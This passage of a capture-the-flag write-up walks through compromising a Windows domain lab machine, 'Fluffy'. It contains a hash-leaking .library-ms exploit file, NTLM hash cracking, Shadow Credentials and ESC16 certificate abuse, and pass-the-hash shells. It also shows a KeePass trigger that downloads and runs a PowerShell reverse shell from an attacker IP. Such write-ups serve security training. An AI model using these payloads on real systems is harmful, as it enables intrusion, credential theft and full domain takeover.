getting file \Everything-1.4.1.1026.x64.zip of size 1827464 as Everything-1.4.1.1026.x64.zip (1188.2 KiloBytes/sec) (average 1068.2 KiloBytes/sec)
smb: \> cd Everything-1.4.1.1026.x64
smb: \Everything-1.4.1.1026.x64\> ls
  .                                   D        0  Fri Apr 18 17:08:44 2025
  ..                                  D        0  Fri Apr 18 17:08:44 2025
  everything.exe                      A  2265104  Fri Aug  2 03:43:54 2024
  Everything.lng                      A   958342  Thu Jul 25 22:19:04 2024

		5842943 blocks of size 4096. 2026981 blocks available
smb: \Everything-1.4.1.1026.x64\>
```

Looking at `Upgrade_Notice.pdf` it looks like a pentest report:

![fluffy-5](/assets/img/ctf/data/fluffy-5.png)

The system seems to be vulnerable to `CVE-2025-24071`. We will try to exploit that.

---

## 🚪 2. Initial Foothold

### CVE-2025-24071

Create the malicious `.library-ms` file:
```bash
$ cat << 'EOF' > exploit.library-ms
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>true</isSupported>
      <simpleLocation>
        <url>\\10.10.14.219\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
EOF
```

Now zip the file:
```bash
$ zip exploit.zip ./exploit.library-ms
  adding: exploit.library-ms (deflated 52%)
```

Start `responder` and wait:
```bash
$ sudo responder -I tun0 -dwv
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

<SNIP>

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [ON]
    Auth proxy                 [OFF]
    SMB server                 [ON]

<SNIP>

```

Now upload the malicious `.library-ms` file:
```bash
$ smbclient "//$IP/IT" -U "$USERNAME%$PASSWORD" -c 'put exploit.zip'
putting file exploit.library-ms as \exploit.library-ms (0.0 kB/s) (average 0.0 kB/s)
```

Now wait for the User to open the directory and trigger the connection to us.

And eventually, you will face the following output in `responder`:
```bash
[SMB] NTLMv2-SSP Client   : 10.129.43.160
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:6265afcf01f58e5b:BBD0E8104A0A26A8583D8D5466DCD5E2:010100000000000080FF7B3861E1DC012C1003A64474989E0000000002000800440035003500410001001E00570049004E002D005500490032003300430052005A004200300054004F0004003400570049004E002D005500490032003300430052005A004200300054004F002E0044003500350041002E004C004F00430041004C000300140044003500350041002E004C004F00430041004C000500140044003500350041002E004C004F00430041004C000700080080FF7B3861E1DC0106000400020000000800300030000000000000000100000000200000F2DC7C6DE25F1B3971D521046178E5D392757710705741670F799BA9FE96D43A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310039000000000000000000
```

Let's crack that hash:
```bash
$ echo 'p.agila::FLUFFY:6265afcf01f58e5b:BBD0E8104A0A26A8583D8D5466DCD5E2:010100000000000080FF7B3861E1DC012C1003A64474989E0000000002000800440035003500410001001E00570049004E002D005500490032003300430052005A004200300054004F0004003400570049004E002D005500490032003300430052005A004200300054004F002E0044003500350041002E004C004F00430041004C000300140044003500350041002E004C004F00430041004C000500140044003500350041002E004C004F00430041004C000700080080FF7B3861E1DC0106000400020000000800300030000000000000000100000000200000F2DC7C6DE25F1B3971D521046178E5D392757710705741670F799BA9FE96D43A0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200310039000000000000000000' > p.agila.hash && \
  hashcat -m 5600 ./p.agila.hash /usr/share/wordlists/rockyou.txt

<SNIP>

P.AGILA::FLUFFY:6265afcf01f58e5b:bbd0e8104a0a26a8583d8d5466dcd5e2:010100000000000080ff7b3861e1dc012c1003a64474989e0000000002000800440035003500410001001e00570049004e002d005500490032003300430052005a004200300054004f0004003400570049004e002d005500490032003300430052005a004200300054004f002e0044003500350041002e004c004f00430041004c000300140044003500350041002e004c004f00430041004c000500140044003500350041002e004c004f00430041004c000700080080ff7b3861e1dc0106000400020000000800300030000000000000000100000000200000f2dc7c6de25f1b3971d521046178e5d392757710705741670f799ba9fe96d43a0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003200310039000000000000000000:prometheusx-303

<SNIP>
```

Found credentials: `p.agila` / `prometheusx-303`.

Looking at the privileges and permissions of `p.agila`, we find the following:
![fluffy-6](/assets/img/ctf/data/fluffy-6.png)

`p.agila` has `GenericAll` over `SERVICE_ACCOUNTS` which has `GenericAll` over `LDAP_SVC`, `WINRM_SVC` and `CA_SVC`.

As `p.agila` is no member of group `REMOTE USERS`, we won't be able to get a shell via winrm using her credentials. But we can retrieve the credentials of the `WINRM_SVC` service and authenticate then.

1. Export credentials
2. Set time to solve `timescrew` error
3. Add `p.agila` to the `SERVICE ACCOUNTS` group in order to perform a Shadow Credentials attack.
4. Shadow Credentials Attack on `WINRM_SVC` (get NTLM hash).
5. Shadow Credentials Attack on `CA_SVC` (get NTLM hash).
=> Get hashes of `WINRM_SVC` and `CA_SVC` without changing any passwords.

```bash
$ USERNAME='p.agila' ; PASSWORD='prometheusx-303' && \
  sudo ntpdate $DOMAIN && \
  bloodyAD --host $IP -d $DOMAIN -u $USERNAME -p $PASSWORD add groupMember "SERVICE ACCOUNTS" $USERNAME && \
  certipy-ad shadow auto -u $USERNAME -p $PASSWORD -account 'WINRM_SVC' -target DC01.fluffy.htb -dc-ip $IP && \
  certipy-ad shadow auto -u $USERNAME -p $PASSWORD -account 'CA_SVC' -target DC01.fluffy.htb -dc-ip $IP

2026-05-11 23:54:35.331581 (+0200) -0.001380 +/- 0.010030 fluffy.htb 10.129.43.160 s1 no-leap
[+] p.agila added to SERVICE ACCOUNTS
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'winrm_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '13b4144b561f4bd09384c763ff44086a'
[*] Adding Key Credential with device ID '13b4144b561f4bd09384c763ff44086a' to the Key Credentials for 'winrm_svc'
[*] Successfully added Key Credential with device ID '13b4144b561f4bd09384c763ff44086a' to the Key Credentials for 'winrm_svc'
[*] Authenticating as 'winrm_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'winrm_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'winrm_svc.ccache'
[*] Wrote credential cache to 'winrm_svc.ccache'
[*] Trying to retrieve NT hash for 'winrm_svc'
[*] Restoring the old Key Credentials for 'winrm_svc'
[*] Successfully restored the old Key Credentials for 'winrm_svc'
[*] NT hash for 'winrm_svc': 33bd09dcd697600edf6b3a7af4875767
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Targeting user 'ca_svc'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '75d23daa4a444f148ef8d3ae07ea185d'
[*] Adding Key Credential with device ID '75d23daa4a444f148ef8d3ae07ea185d' to the Key Credentials for 'ca_svc'
[*] Successfully added Key Credential with device ID '75d23daa4a444f148ef8d3ae07ea185d' to the Key Credentials for 'ca_svc'
[*] Authenticating as 'ca_svc' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'ca_svc@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ca_svc.ccache'
[*] Wrote credential cache to 'ca_svc.ccache'
[*] Trying to retrieve NT hash for 'ca_svc'
[*] Restoring the old Key Credentials for 'ca_svc'
[*] Successfully restored the old Key Credentials for 'ca_svc'
[*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
```

Now get a shell:
```bash
$ evil-winrm -i $IP -u WINRM_SVC -H 33bd09dcd697600edf6b3a7af4875767

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> ls ~/Desktop


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        5/11/2026   1:19 PM             34 user.txt


*Evil-WinRM* PS C:\Users\winrm_svc\Documents> cat ~/Desktop/user.txt
[REDACTED]
*Evil-WinRM* PS C:\Users\winrm_svc\Documents>
```

### CVE-2023-24055

> This path is not worth replicating as the payload was not triggered.
{: .info}

Create malicious config file:
```bash
$ echo << EOF > KeePass.config.xml
<?xml version="1.0" encoding="utf-8"?>
<Configuration xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
	<Application>
		<TriggerCollection>
			<Triggers>
				<Trigger>
					<Guid>lztpSRd56EuYtwwqntH7TQ==</Guid>
					<Name>exploit</Name>
					<Events>
						<Event>
							<TypeGuid>56a12140-50d2-4cd4-bc71-3b6c8131d25d</TypeGuid>
							<Parameters>
								<Parameter>0</Parameter>
								<Parameter />
							</Parameters>
						</Event>
					</Events>
					<Conditions />
					<Actions>
						<Action>
							<TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
							<Parameters>
								<Parameter>PowerShell.exe</Parameter>
								<Parameter>-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://<YOUR IP>:1101/shell.ps1')"</Parameter>
								<Parameter>False</Parameter>
								<Parameter>1</Parameter>
								<Parameter />
							</Parameters>
						</Action>
					</Actions>
				</Trigger>
			</Triggers>
		</TriggerCollection>
	</Application>
</Configuration>
EOF
```

Create `shell.ps1` (reverse shell payload):
```bash
$ echo << EOF > shell.ps1
$ client = New-Object System.Net.Sockets.TCPClient("<YOUR IP>",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

Start python web server and nc listener:
```bash
$ python3 -m http.server 1101 & nc -lnvp 1337
```

Now upload the file and wait for the bot to trigger the payload:
```bash
$ smbclient "//$IP/IT" -U "$USERNAME%$PASSWORD" -c 'cd KeePass-2.58; put KeePass.config.xml'

putting file KeePass.config.xml as \KeePass-2.58\KeePass.config.xml (10.0 kB/s) (average 10.0 kB/s)
```

But unfortunetaly, this payload was never triggered although this KeePass version is vulnerable. Anyways, we will continue with the first vulnerability (CVE-2025-24071).

---

## 📈 3. Privilege Escalation (`CA_SVC` -> `Administrator`)

```bash
$ certipy-ad find -u 'ca_svc' -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 14 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'fluffy-DC01-CA' via RRP
[*] Successfully retrieved CA configuration for 'fluffy-DC01-CA'
[*] Checking web enrollment for CA 'fluffy-DC01-CA' @ 'DC01.fluffy.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20260512000303_Certipy.txt'
[*] Wrote text output to '20260512000303_Certipy.txt'
[*] Saving JSON output to '20260512000303_Certipy.json'
[*] Wrote JSON output to '20260512000303_Certipy.json'

$ cat *Certipy.txt
Certificate Authorities
  0
    CA Name                             : fluffy-DC01-CA
    DNS Name                            : DC01.fluffy.htb
    Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
    Certificate Serial Number           : 3150FA7E60CE28AD4DAE41A1B61D8874
    Certificate Validity Start          : 2025-04-17 16:00:16+00:00
    Certificate Validity End            : 3024-04-17 16:12:16+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Disabled Extensions                 : 1.3.6.1.4.1.311.25.2
    Permissions
      Owner                             : FLUFFY.HTB\Administrators
      Access Rights
        ManageCa                        : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        ManageCertificates              : FLUFFY.HTB\Domain Admins
                                          FLUFFY.HTB\Enterprise Admins
                                          FLUFFY.HTB\Administrators
        Enroll                          : FLUFFY.HTB\Cert Publishers
                                          FLUFFY.HTB\Administrators
        Read                            : FLUFFY.HTB\Administrators
    [!] Vulnerabilities
      ESC16                             : Security Extension is disabled.
    [*] Remarks
      ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
Certificate Templates                   : [!] Could not find any certificate templates
```

The Domain is vulnerable to `ESC16`. A great resource for all `ESC`s: [ly4k-github](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation):

ESC16 is a "SID Bypass" vulnerability. Normally, certificates include a unique SID extension to prevent spoofing. With it disabled, the Domain Controller relies on the UPN (User Principal Name) or SAN (Subject Alternative Name) to identify the user. If we find a template that allows us to supply a subject (like ESC1), ESC16 makes the impersonation of a Domain Admin much more "reliable" on modern, patched systems.

To exploit the ESC16 misconfiguration, we first have to update the UPN (User Principal Name) of the `CA_SVC` user to `Administrator`.
```bash
$ certipy-ad account update -dc-ip $IP -u $USERNAME -p $PASSWORD -user CA_SVC -upn 'Administrator'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : Administrator
[*] Successfully updated 'ca_svc'
```

Then, a certificate has to be requested as the `CA_SVC` service account. Since the `CA_SVC` user's UPN has been updated
to `Administrator`, the resulting certificate will allow us to authenticate as the Domain Administrator. Note
that the User template (a default template in the CA) is used here:
```bash
$ certipy-ad req -u CA_SVC -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip $IP -target 'dc01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 28
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
> Note that this might fail, just execute the command a couple of times until the `administrator.pfx` file is generated.

Before using the `administrator.pfx` certificate, the changed UPN of the `CA_SVC` user has to be changed back to its original value:
```bash
$ certipy-ad account update -u $USERNAME -p $PASSWORD -user ca_svc -upn 'CA_SVC' -dc-ip $IP

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Updating user 'ca_svc':
    userPrincipalName                   : CA_SVC
[*] Successfully updated 'ca_svc'
```

Grab the hash now:
```bash
$ certipy-ad auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $IP

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*] Using principal: 'administrator@fluffy.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```

Cash:
```bash
$ evil-winrm -i $IP -u Administrator -H 8da83a3fa618b6e3a00e93f676c92a6e

<SNIP>

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
[REDACTED]
*Evil-WinRM* PS C:\Users\Administrator\Desktop>
```

---

## 🧠 Retrospective

* **Learnings:**
  1. Never rely on tools: When I used `nxc smb` to download all files from the shares as the first user, it didn't show me / download the `Upgrade_Notice.pdf` file for me, which forced me into a rabbit hole. Always make sure to enumerate manually or at least check that the tools worked correctly.
  2. ESC16: Occurs when the `szOID_NTDS_CA_SECURITY_EXTENSIONS` (the SID extension) is disabled on the CA. Because the KDC uses `SID` AND `UPN` to verify your identity via a certificate, it requires both. But when a certificate does not require the `SID` to be set (which cannot be changed by a user), then basically changing the `UPN` will grant us Domain Admin.
  3. ESC16 - Why change the UPN back? If two accounts have the same UPN, the Kerberos Key Distribution Center (KDC) gets confused. When you try to use certipy-ad auth, the DC might try to map the certificate to your original CA_SVC account instead of the real Administrator account, or it might just error out because UPNs are supposed to be unique. By changing it back, you ensure the real Administrator account remains the only "true" owner of that UPN in the eyes of the KDC, allowing your forged certificate to map correctly to the target RID 500 (Admin) account.
  4. CA_SVC account: In a real-world environment, CA_SVC is the Service Account that runs the Active Directory Certificate Services. It's usually a member of Cert Publishers. This group has the right to publish certificates to the userCertificate attribute of objects in AD. In this case, the account had enough permissions to update its own userPrincipalName. Service accounts are often overlooked in security audits, making them perfect "Shadow Admins."
